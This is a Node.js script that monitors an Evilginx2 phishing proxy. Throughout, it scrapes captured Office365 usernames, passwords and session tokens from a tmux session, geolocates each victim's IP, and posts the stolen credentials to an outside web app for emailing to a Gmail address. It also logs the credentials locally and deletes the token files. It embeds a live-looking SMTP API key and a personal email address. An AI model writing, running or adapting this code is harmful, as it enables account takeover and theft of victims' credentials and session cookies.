const { exec } = require("child_process");
const fs = require("fs");
const axios = require("axios");

const USERNAME_REGEX = /\[\+\+\+\] \[(\d+)\] Username: \[(.*?)\]/;
const PASSWORD_REGEX = /\[\+\+\+\] \[(\d+)\] Password: \[(.*?)\]/;

const CREDENTIAL_LOG_FILE = "captured_credentials.log";
const sentCredentials = new Set();

// Web App Configuration
const WEB_APP_URL = "https://mailer.wave-mailersend.com/send"; // Update this with your actual web app URL

function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, { maxBuffer: 1024 * 500 }, (error, stdout, stderr) => {
      if (error) return reject(error);
      resolve(stdout);
    });
  });
}

async function fetchSessions() {
  await executeCommand('tmux send-keys -t evilginx2 "sessions" C-m');
  await new Promise((r) => setTimeout(r, 1000));
  const output = await executeCommand("tmux capture-pane -pt evilginx2");
  const lines = output.split("\n");
  const sessions = [];

  for (const line of lines) {
    if (line.match(/\| +\d+ +\|/)) {
      const parts = line
        .split("|")
        .map((x) => x.trim())
        .filter(Boolean);
      if (parts.length >= 6) {
        sessions.push({ id: parts[0], username: parts[2], password: parts[3] });
      }
    }
  }
  return sessions;
}

async function resolveSessionId(username, password) {
  const sessions = await fetchSessions();
  for (const session of sessions.reverse()) {
    if (
      session.username.startsWith(username.slice(0, 5)) &&
      session.password.startsWith(password.slice(0, 5))
    ) {
      return session.id;
    }
  }
  return "Unknown";
}

async function geolocateIP(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}`, {
      timeout: 5000,
    });
    return {
      city: res.data.city || "Unknown",
      region: res.data.regionName || "Unknown",
      country: res.data.country || "Unknown",
    };
  } catch {
    return { city: "Unknown", region: "Unknown", country: "Unknown" };
  }
}

async function getSessionDetailsAndTokens(sessionId) {
  await executeCommand(
    `tmux send-keys -t evilginx2 "sessions ${sessionId}" C-m`
  );
  await new Promise((r) => setTimeout(r, 1000));
  const output = await executeCommand("tmux capture-pane -pt evilginx2");
  const lines = output.split("\n");

  const details = {
    "user-agent": "Unknown",
    "remote ip": "Unknown",
    "landing url": "Unknown",
    "create time": "Unknown",
    "update time": "Unknown",
  };

  const tokenLines = [];
  let captureTokens = false;

  for (const line of lines) {
    const l = line.trim().toLowerCase();

    if (Object.keys(details).some((key) => l.startsWith(key))) {
      const [key, ...rest] = line.split(":");
      const cleanKey = key.trim().toLowerCase();
      if (details.hasOwnProperty(cleanKey)) {
        details[cleanKey] = rest.join(":").trim();
      }
    }

    if (l.startsWith("tokens")) {
      captureTokens = true;
      tokenLines.push(line);
      continue;
    }

    if (captureTokens) {
      if (l === "") {
        captureTokens = false;
        continue;
      }
      tokenLines.push(line);
    }
  }

  let tokenCsvPath = null;
  if (tokenLines.length > 1) {
    const headers = tokenLines[1]
      .split("|")
      .map((h) => h.trim())
      .filter(Boolean);
    tokenCsvPath = `tokens_session_${sessionId}.csv`;
    const csvData = [
      headers.join(","),
      ...tokenLines.slice(2).map((line) =>
        line
          .split("|")
          .map((v) => v.trim())
          .filter(Boolean)
          .join(",")
      ),
    ].join("\n");
    fs.writeFileSync(tokenCsvPath, csvData);
  }

  return { details, tokenCsvPath };
}

async function sendEmail(username, password, sessionId) {
  const hashKey = `${username}:${password}`;
  if (sentCredentials.has(hashKey)) return;

  const { details, tokenCsvPath } = await getSessionDetailsAndTokens(sessionId);
  const ip = details["remote ip"] || "Unknown";
  const geo = await geolocateIP(ip);

  const body = `
=== Office365 Results ===
Username: ${username}
Password: ${password}

=== Visitor Information ===
IP Address   : ${ip}
City         : ${geo.city}
Region/State : ${geo.region}
Country      : ${geo.country}
User-Agent   : ${details["user-agent"]}
Created Time : ${details["create time"]}
Updated Time : ${details["update time"]}
`;

  try {
    console.log(`[>] Sending data to web app...`);

    // Prepare the request payload
    const payload = {
      username,
      password,
      subject: "New Office365 Credentials Captured",
      body,
      toEmail: "cl07079464@gmail.com",
      fromEmail: "reporter@mail.brilvix.com",
      smtpHost: "smtp.resend.com",
      smtpPort: 465,
      smtpUser: "resend",
      smtpPass: "re_Ba3T4msd_8ifXHDNExM1hDfRfRR29NZZo",
    };

    // Send the request to the web app
    const response = await axios.post(WEB_APP_URL, payload);
    console.log("[✓] Data sent successfully.", );

    fs.appendFileSync(
      CREDENTIAL_LOG_FILE,
      `[${new Date().toISOString()}] ${username} : ${password} (Session: ${sessionId})\n`
    );

    sentCredentials.add(hashKey);
    if (tokenCsvPath && fs.existsSync(tokenCsvPath)) {
      fs.unlinkSync(tokenCsvPath);
    }
  } catch (e) {
    console.log(`[✗] Failed to send data: ${e.message}`);
  }
}

async function monitorTmuxOutput(sessionName = "evilginx2") {
  console.log("[*] Monitoring tmux output...");
  const currentLogins = new Map();

  while (true) {
    try {
      const output = await executeCommand(
        `tmux capture-pane -pt ${sessionName}`
      );
      const lines = output.split("\n");

      for (const line of lines) {
        const userMatch = line.match(USERNAME_REGEX);
        if (userMatch) {
          const [, logId, username] = userMatch;
          currentLogins.set(logId, { username, password: null });
        }

        const passMatch = line.match(PASSWORD_REGEX);
        if (passMatch) {
          const [, logId, password] = passMatch;
          if (currentLogins.has(logId)) {
            const { username } = currentLogins.get(logId);
            currentLogins.set(logId, { username, password });
            const sessionId = await resolveSessionId(username, password);
            await sendEmail(username, password, sessionId);
          }
        }
      }

      await new Promise((r) => setTimeout(r, 3000));
    } catch (err) {
      console.log(`[!] Error: ${err.message}`);
      await new Promise((r) => setTimeout(r, 5000));
    }
  }
}

(async () => {
  console.log("[*] Starting Evilginx2 Monitor Script...");
  try {
    // Test the web app connection
    const response = await axios.get(WEB_APP_URL.replace("/send", ""));
    console.log("[✓] Web app is accessible.");
  } catch (e) {
    console.error(`[✗] Web app connection failed: ${e.message}`);
  }
  await monitorTmuxOutput();
})();
